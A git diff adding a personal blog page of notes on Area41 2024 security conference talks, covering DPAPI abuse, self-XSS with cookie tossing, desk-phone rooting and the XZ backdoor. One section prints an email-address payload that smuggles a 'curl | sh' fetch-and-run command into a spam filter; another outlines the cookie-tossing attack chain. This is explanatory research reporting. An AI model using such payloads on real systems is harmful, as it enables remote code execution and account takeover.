@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Area41 2024 (notes)</title>
+    <meta name="description" content="">
+    <meta name="author" content=''>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+</head>
+<body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row p-0">
+        <a class="navbar-brand mr-sm-auto" href="http://localhost:1313/">darkvolumes</a>
+        <div class="navbar-nav flex-row">
+            
+                
+                
+                     <a class="nav-item nav-link" href="/infosec">InfoSec</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/photos">Photos</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/movie-maps">Movies</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/art">Art</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/reading">Reading</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/about">About</a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                     <a class="nav-item nav-link" href="/index.xml"><img src="/rss.svg" width="16" alt="RSS Feed"></a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <h1 id="area41">Area41</h1>
+<p>Why writing these notes?
+They are an easy way to find references in some years time, for instance if I will recall a presentation, will I remember:</p>
+<ul>
+<li>which conference was it?</li>
+<li>which speaker?</li>
+<li>where are the slides?</li>
+</ul>
+<p><strong>Note.</strong> At the time of writing slides are not published but most talks will be available at <a href="https://www.youtube.com/@defconswitzerland/">https://www.youtube.com/@defconswitzerland/</a></p>
+<h2 id="keynote">Keynote</h2>
+<p><strong>Speaker.</strong> Paula Januszkiewicz <code>@PaulaCqure</code></p>
+<p>Keynote with technical demos, showing two nice tricks: given local admin access to a workstation, if another user is logged into the machine, it is possible to start a service as that user.
+Second trick: NTDS.DIT contains the certificate to encrypt DPAPI keys, including passwords stored in Chrome. Note that after a compromise, it is not possible to change that certificate (unless multiple hacks are used involving losing customer support).</p>
+<p>The tools do decrypt Chrome passwords can be looked up as <code>CQTools</code>, <code>CQURE</code>, <code>DPAPI</code>.</p>
+<h2 id="switching-400000-volts-with-a-tcp-packet">Switching 400'000 Volts with a TCP packet</h2>
+<p><strong>Speaker.</strong> Cyrill Brunschwiler <code>@cybrz</code></p>
+<p>Talk on the swiss electrical grid and substations. Given my complete lack of knowledge in the field of electricity I did not understand a thing but I found it interesting to be exposed to infrastructure completely unknown to me. In addition, one of the take-aways was that cyber attacks can cause black outs lasting from hours to a day but, in case of war, the real threat are missiles.</p>
+<h2 id="armored-witness---building-a-trusted-notary-for-bare-metal">Armored Witness - Building a Trusted Notary for Bare Metal</h2>
+<p><strong>Speaker.</strong> Andrea Barisani - <code>@AndreaBarisani</code></p>
+<p>Presentation of the <a href="https://transparency.dev/">https://transparency.dev/</a> project, based on the TamaGo and GoTEE frameworks.
+Best to check out the project website rather than summarizing it here.</p>
+<h2 id="self-xss-with-cookie-tossing">Self-XSS with Cookie Tossing</h2>
+<p><strong>Speaker.</strong> Thomas Houhou <code>@Th0h0</code></p>
+<p>The talk explores how can self-XSS be abused in combination with cookie tossing.
+The idea is as follows:</p>
+<ul>
+<li>self-xss in parent-domain.com on e.g. /profile</li>
+<li>attacker has control of subdomain: either XSS or ownership (e.g. attacker-blog.parent-domain.com)</li>
+<li>the attacker sends the victim a link to the controlled subdomain</li>
+<li>from the controlled subdomain the attacker sets a cookie for the path parent-domain.com/profile (where the self XSS is present on the parent domain)</li>
+<li>on that path the victim is logged as the attacker</li>
+<li>the self-xss executes, it is now possible to perform actions, e.g. <code>/get-contacts</code> in the session of the victim (the pre-requisite is that the vicitm is already logged-in on parent-domain.com)</li>
+</ul>
+<h2 id="hacking-desktop-phones">Hacking Desktop Phones</h2>
+<p><strong>Speaker</strong>. Michael Oelke</p>
+<p>The talk presents multiple ways to compromise desktop phones provided physical access</p>
+<p>Main take-away from my perspective: these phones offer a full linux box where it is easy to priv-esc. If the phones are not deployed in a dedicated and restricted V-LAN, they offer an interesting place for persistence given that no EDR is running on them.</p>
+<p>Blogpost: <a href="https://www.pentagrid.ch/en/blog/rce-and-local-root-in-openstage-and-openscape-phones/">https://www.pentagrid.ch/en/blog/rce-and-local-root-in-openstage-and-openscape-phones/</a>.</p>
+<h2 id="shells-at-midnight-turning-a-spam-filter-against-itself">Shells at Midnight: Turning a Spam Filter Against Itself</h2>
+<p><strong>Speaker.</strong> Michael Imfeld <code>@born0nmonday@chaos.social</code></p>
+<p>The talks covers a command injection vulnerability in the ClearMail spam filter, where the email addressed is used in a perl script running in a cron job. Within the email RFC it is possible to satisfy the constraints and get a <code>curl | sh</code> into the email address.</p>
+<p>TL;DR;</p>
+<pre tabindex="0"><code>john.doe+|||a=`df|tac`&amp;&amp;curl${a##*d}.modzero.com|cat|sh||@gmail.com
+</code></pre><p>Blogpost:
+<a href="https://modzero.com/en/blog/beyond_the_at_symbol/">https://modzero.com/en/blog/beyond_the_at_symbol/</a></p>
+<h2 id="phishing-for-primary-refresh-tokens-in-microsoft-entra">Phishing for Primary Refresh Tokens in Microsoft Entra</h2>
+<p><strong>Speaker</strong>. Dirk-jan Mollema <code>@_dirkjan</code></p>
+<p>The talk explores how the provisioning of MFA methods provided by Microsoft Entra is done from scenarios where strong authentication cannot be enforced, e.g. during the device setup.</p>
+<h2 id="technical-deep-dive-into-the-xz-backdoor">Technical Deep Dive into the XZ backdoor</h2>
+<p><strong>Speaker.</strong> Timo Schmid <code>@bluec0re</code></p>
+<p>A <em>technical</em> deep dive into the XZ backdoor (not covering evaluations on timeline, attribution etc.)</p>
+<p>Slides: <a href="https://docs.google.com/presentation/d/1svZTSUcUDxRfTaMfaFmozBNFUvIvWa_1ApUY5yB4BAc/edit?usp=drivesdk">https://docs.google.com/presentation/d/1svZTSUcUDxRfTaMfaFmozBNFUvIvWa_1ApUY5yB4BAc/edit?usp=drivesdk</a></p>
+<h2 id="red-cell---mimicking-threat-actors-for-realistic-responses">Red Cell - Mimicking Threat Actors for Realistic Responses</h2>
+<p><strong>Speaker.</strong> Thomas Chopitea <code>@tomchop_</code></p>
+<p>The talks covers the difference between a red cell excercise and red teams. It also provides tips on how to balance well being of employees with keeping the threat real (e.g. do you inform the  blue team that they are dealing with an excercise, and if so, after how many days? Do you pause the excercise in the weekend? Both on the defense and on the offense?)</p>
+
+</div>
+
+        </div>
+</body>
+</html>
